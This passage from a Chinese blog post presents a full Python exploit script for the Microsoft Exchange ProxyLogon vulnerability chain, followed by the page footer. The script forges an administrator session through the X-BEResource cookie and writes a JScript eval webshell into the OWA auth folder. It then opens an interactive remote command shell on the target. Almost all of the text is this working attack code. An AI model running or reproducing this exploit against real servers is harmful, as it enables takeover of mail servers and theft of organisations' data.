&quot;RawIdentity&quot;: &quot;73fff9ed-d8f5-484e-9328-5b76048abdb2&quot;&#125;, &quot;properties&quot;: &#123;&quot;Parameters&quot;: &#123;&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\BF2DmInPbRqNlrwT4CXo.aspx&quot;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>



<h2 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br>requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)<br><br><br>fuzz_email = [<span class="hljs-string">&#x27;administrator&#x27;</span>, <span class="hljs-string">&#x27;webmaste&#x27;</span>, <span class="hljs-string">&#x27;support&#x27;</span>, <span class="hljs-string">&#x27;sales&#x27;</span>, <span class="hljs-string">&#x27;contact&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>,<br>              <span class="hljs-string">&#x27;test2&#x27;</span>, <span class="hljs-string">&#x27;test01&#x27;</span>, <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>, <span class="hljs-string">&#x27;sysadmin&#x27;</span>, <span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;noreply&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;no-reply&#x27;</span>]<br><br>proxies = &#123;&#125;<br>user_agent = <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;</span><br><br>shell_path = <span class="hljs-string">&quot;Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx&quot;</span><br>shell_absolute_path = <span class="hljs-string">&quot;\\\\127.0.0.1\\c$\\%s&quot;</span> % shell_path<br><span class="hljs-comment"># webshell-马子内容</span><br>shell_content = <span class="hljs-string">&#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;</span><br><br>final_shell = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">id_generator</span>(<span class="hljs-params">size=<span class="hljs-number">6</span>, chars=string.ascii_lowercase + string.digits</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br><br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\n如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-user&#x27;</span>,<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;exist email&#x27;</span>, default=<span class="hljs-string">&#x27;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-suffix&#x27;</span>,<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;email suffix&#x27;</span>)<br>    args = parser.parse_args()<br>    target = args.u<br>    suffix = args.suffix<br>    <span class="hljs-keyword">if</span> suffix == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请输入suffix&quot;</span>)<br><br>    exist_email = args.user<br>    <span class="hljs-keyword">if</span> exist_email:<br>        fuzz_email.insert(<span class="hljs-number">0</span>, exist_email)<br>    random_name = id_generator(<span class="hljs-number">4</span>) + <span class="hljs-string">&quot;.js&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;目标 Exchange Server: &quot;</span> + target)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fuzz_email:<br>        new_email = i+suffix<br>        autoDiscoverBody = <span class="hljs-string">&quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;</span><br><span class="hljs-string">    &lt;Request&gt;</span><br><span class="hljs-string">      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span><br><span class="hljs-string">    &lt;/Request&gt;</span><br><span class="hljs-string">&lt;/Autodiscover&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % new_email<br>        <span class="hljs-comment"># print(&quot;get FQDN&quot;)</span><br>        FQDN = <span class="hljs-string">&quot;EXCHANGE01&quot;</span><br>        ct = requests.get(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=localhost~1942062522&quot;</span>,<br>                                                                            <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent&#125;,<br>                      verify=<span class="hljs-literal">False</span>, proxies=proxies)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;X-CalculatedBETarget&quot;</span> <span class="hljs-keyword">in</span> ct.headers <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;X-FEServer&quot;</span> <span class="hljs-keyword">in</span> ct.headers:<br>            FQDN = ct.headers[<span class="hljs-string">&quot;X-FEServer&quot;</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;got FQDN:&quot;</span> + FQDN)<br><br>        ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1941962757;&quot;</span> % FQDN,<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent&#125;,<br>            data=autoDiscoverBody,<br>            proxies=proxies,<br>            verify=<span class="hljs-literal">False</span><br>        )<br><br>        <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(ct.status_code)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Autodiscover Error!&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;LegacyDN&gt;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(ct.content):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Can not get LegacyDN!&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            legacyDn = <span class="hljs-built_in">str</span>(ct.content).split(<span class="hljs-string">&quot;&lt;LegacyDN&gt;&quot;</span>)[<br>                <span class="hljs-number">1</span>].split(<span class="hljs-string">r&quot;&lt;/LegacyDN&gt;&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got DN: &quot;</span> + legacyDn)<br><br>            mapi_body = legacyDn + \<br>                <span class="hljs-string">&quot;\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00&quot;</span><br><br>            ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>                <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot;</span> % FQDN,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/mapi-http&quot;</span>,<br>                <span class="hljs-string">&quot;X-Requesttype&quot;</span>: <span class="hljs-string">&quot;Connect&quot;</span>,<br>                <span class="hljs-string">&quot;X-Clientinfo&quot;</span>: <span class="hljs-string">&quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;</span>,<br>                <span class="hljs-string">&quot;X-Clientapplication&quot;</span>: <span class="hljs-string">&quot;Outlook/15.0.4815.1002&quot;</span>,<br>                <span class="hljs-string">&quot;X-Requestid&quot;</span>: <span class="hljs-string">&quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;</span>,<br>                <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent<br>            &#125;,<br>                data=mapi_body,<br>                verify=<span class="hljs-literal">False</span>,<br>                proxies=proxies<br>            )<br>            <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;act as owner of a UserMailbox&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(ct.content):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mapi Error!&quot;</span>)<br>                exit()<br><br>            sid = <span class="hljs-built_in">str</span>(ct.content).split(<span class="hljs-string">&quot;with SID &quot;</span>)[<br>                <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; and MasterAccountSid&quot;</span>)[<span class="hljs-number">0</span>]<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got SID: &quot;</span> + sid)<br>            sid = sid.replace(sid.split(<span class="hljs-string">&quot;-&quot;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-string">&quot;500&quot;</span>)<br><br>            proxyLogon_request = <span class="hljs-string">&quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span> % sid<br><br>            ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>                <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;&quot;</span> % FQDN,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/xml&quot;</span>,<br>                <span class="hljs-string">&quot;msExchLogonMailbox&quot;</span>: <span class="hljs-string">&quot;S-1-5-20&quot;</span>,<br>                <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent<br>            &#125;,<br>                data=proxyLogon_request,<br>                proxies=proxies,<br>                verify=<span class="hljs-literal">False</span><br>            )<br>            <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">241</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&quot;set-cookie&quot;</span> <span class="hljs-keyword">in</span> ct.headers:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Proxylogon Error!&quot;</span>)<br>                exit()<br><br>            sess_id = ct.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>].split(<br>                <span class="hljs-string">&quot;ASP.NET_SessionId=&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>]<br><br>            msExchEcpCanary = ct.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>].split(<span class="hljs-string">&quot;msExchEcpCanary=&quot;</span>)[<br>                <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got session id: &quot;</span> + sess_id)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got canary: &quot;</span> + msExchEcpCanary)<br><br>            ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>                <span class="hljs-comment"># &quot;Cookie&quot;: &quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot; % (</span><br>                <span class="hljs-comment"># FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),</span><br><br>                <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=Admin@&#123;server_name&#125;:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&amp;schema=VirtualDirectory&amp;msExchEcpCanary=&#123;msExchEcpCanary&#125;&amp;a=~1942062522; ASP.NET_SessionId=&#123;sess_id&#125;; msExchEcpCanary=&#123;msExchEcpCanary1&#125;&quot;</span>.<br>                            <span class="hljs-built_in">format</span>(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,<br>                                    msExchEcpCanary=msExchEcpCanary),<br>                            <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json; charset=utf-8&quot;</span>,<br>                            <span class="hljs-string">&quot;msExchLogonMailbox&quot;</span>: <span class="hljs-string">&quot;S-1-5-20&quot;</span>,<br>                            <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent<br><br>                            &#125;,<br>                            json=&#123;<span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>                                <span class="hljs-string">&quot;Parameters&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,<br>                                                <span class="hljs-string">&quot;SelectedView&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;SelectedVDirType&quot;</span>: <span class="hljs-string">&quot;OAB&quot;</span>&#125;&#125;, <span class="hljs-string">&quot;sort&quot;</span>: &#123;&#125;&#125;,<br>                            verify=<span class="hljs-literal">False</span>,<br>                            proxies=proxies<br>                            )<br>			<br>            <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GetOAB Error!&quot;</span>)<br>                exit()<br>            oabId = <span class="hljs-built_in">str</span>(ct.content).split(<span class="hljs-string">&#x27;&quot;RawIdentity&quot;:&quot;&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;&quot;&#x27;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got OAB id: &quot;</span> + oabId)<br><br>            oab_json = &#123;<span class="hljs-string">&quot;identity&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;Identity:ECP&quot;</span>, <span class="hljs-string">&quot;DisplayName&quot;</span>: <span class="hljs-string">&quot;OAB (Default Web Site)&quot;</span>, <span class="hljs-string">&quot;RawIdentity&quot;</span>: oabId&#125;,<br>                        <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;Parameters&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,<br>                                        <span class="hljs-string">&quot;ExternalUrl&quot;</span>: <span class="hljs-string">&quot;http://ffff/#%s&quot;</span> % shell_content&#125;&#125;&#125;<br><br>            ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>                <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (<br>                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),<br>                <span class="hljs-string">&quot;msExchLogonMailbox&quot;</span>: <span class="hljs-string">&quot;S-1-5-20&quot;</span>,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json; charset=utf-8&quot;</span>,<br>                <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent<br>            &#125;,<br>                json=oab_json,<br>                proxies=proxies,<br>                verify=<span class="hljs-literal">False</span><br>            )<br>            <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Set external url Error!&quot;</span>)<br>                exit()<br><br>            reset_oab_body = &#123;<span class="hljs-string">&quot;identity&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;Identity:ECP&quot;</span>, <span class="hljs-string">&quot;DisplayName&quot;</span>: <span class="hljs-string">&quot;OAB (Default Web Site)&quot;</span>, <span class="hljs-string">&quot;RawIdentity&quot;</span>: oabId&#125;,<br>                            <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>                                <span class="hljs-string">&quot;Parameters&quot;</span>: &#123;<span class="hljs-string">&quot;__type&quot;</span>: <span class="hljs-string">&quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;</span>,<br>                                                <span class="hljs-string">&quot;FilePathName&quot;</span>: shell_absolute_path&#125;&#125;&#125;<br><br>            ct = requests.post(<span class="hljs-string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<br>                <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=%s&amp;a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s&quot;</span> % (<br>                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),<br>                <span class="hljs-string">&quot;msExchLogonMailbox&quot;</span>: <span class="hljs-string">&quot;S-1-5-20&quot;</span>,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json; charset=utf-8&quot;</span>,<br>                <span class="hljs-string">&quot;User-Agent&quot;</span>: user_agent<br>            &#125;,<br>                json=reset_oab_body,<br>                proxies=proxies,<br>                verify=<span class="hljs-literal">False</span><br>            )<br><br>            <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入shell失败&quot;</span>)<br>                exit()<br>            shell_url = <span class="hljs-string">&quot;https://&quot;</span>+target+<span class="hljs-string">&quot;/owa/auth/test11.aspx&quot;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功写入shell：&quot;</span> + shell_url)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下面验证shell是否ok&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;code=Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll());&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在请求shell&quot;</span>)<br>            <span class="hljs-keyword">import</span> time<br>            time.sleep(<span class="hljs-number">1</span>)<br>            data = requests.post(shell_url, data=&#123;<br>                                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;Response.Write(new ActiveXObject(\&quot;WScript.Shell\&quot;).exec(\&quot;whoami\&quot;).StdOut.ReadAll());&quot;</span>&#125;, verify=<span class="hljs-literal">False</span>, proxies=proxies)<br>            <span class="hljs-keyword">if</span> data.status_code != <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入shell失败&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shell:&quot;</span>+data.text.split(<span class="hljs-string">&quot;OAB (Default Web Site)&quot;</span>)<br>                    [<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;Name                            : &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]用户名: &#x27;</span>+ new_email)<br>                final_shell = shell_url<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]用户名: &#x27;</span>+new_email)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=============================&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> final_shell:<br>        sys.exit()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;下面启用交互式shell&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        input_cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[#] command: &quot;</span>)<br>        data=&#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;Response.Write(new ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c %s&quot;).stdout.readall())&quot;&quot;&quot;</span> % input_cmd&#125;<br>        ct = requests.post(<br>            final_shell,<br>            data=data,verify=<span class="hljs-literal">False</span>, proxies=proxies)<br>        <span class="hljs-keyword">if</span> ct.status_code != <span class="hljs-number">200</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;OAB (Default Web Site)&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ct.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Failed to execute shell command&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            shell_response = ct.text.split(<br>                <span class="hljs-string">&quot;Name                            :&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-built_in">print</span>(shell_response)<br></code></pre></div></td></tr></table></figure>



<p><img src="https://img-blog.csdnimg.cn/908432bbe6ea4c55827ae1c77a364c9c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/windows/">windows</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/windows/">windows</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
